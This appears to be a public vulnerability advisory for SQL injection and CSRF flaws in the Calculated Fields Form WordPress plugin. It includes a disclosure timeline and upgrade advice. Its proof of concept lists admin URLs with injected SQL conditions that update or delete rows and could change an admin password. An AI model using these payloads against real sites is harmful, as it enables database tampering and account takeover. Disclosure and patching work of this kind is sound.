@@ -1,0 +1,37 @@
+[+] Calculated Fields Form Wordpress Plugin <= 1.0.10 - Remote SQL Injection Vulnerability
+[+] Author: Ibrahim Raafat
+[+] Twitter: https://twitter.com/RaafatSEC
+[+] Plugin: https://wordpress.org/plugins/calculated-fields-form/
+
+[+] TimeLine
+	[-] Feb 6 2015, The vulnerabilities reported
+	[-] Feb 7 2015, Response and Confirming the vulnerabilities 
+	[-] Feb 8 2015, First fixing released to version 1.0.11
+	[-] Feb 17 2015, CSRF protection added to version 1.0.12
+	[-] March 1 2015, Public Disclosure
+
+[+] Download: https://downloads.wordpress.org/plugin/calculated-fields-form.1.0.10.zip
+
+[+] Description:
+	There are sql injection vulnerabilities in Calculated Fields Form Plugin
+	which could allow the attacker to execute sql queries into database
+
+[+] Vulnerable Code: [Red]
+https://plugins.trac.wordpress.org/changeset/1084937/calculated-fields-form
+
+[+] POC: 
+
+/wp-admin/options-general.php?page=cp_calculated_fields_form&u=2 and 1=1&name=InsertText 
+/wp-admin/options-general.php?page=cp_calculated_fields_form&u=2 or 1=1&name=InsertText // Will update all
+/wp-admin/options-general.php?page=cp_calculated_fields_form&c=21 and 1=1 
+/wp-admin/options-general.php?page=cp_calculated_fields_form&d=3 and 1=2  Delete
+
+These queries are execute without any csrf protection, The attacker can use this csrf vulnerability to execute queries in the sql by sending malicious page to the logged in admin
+
+[+] Impact: Attacker can use this vulnerabilities to update admin password
+
+[+] Recommendation: If you are using 1.0.12 or less, Upgrade the plugin ASAP
+
+[+] @lnxg33k Enta Sa3eed Bahlol?
+
+
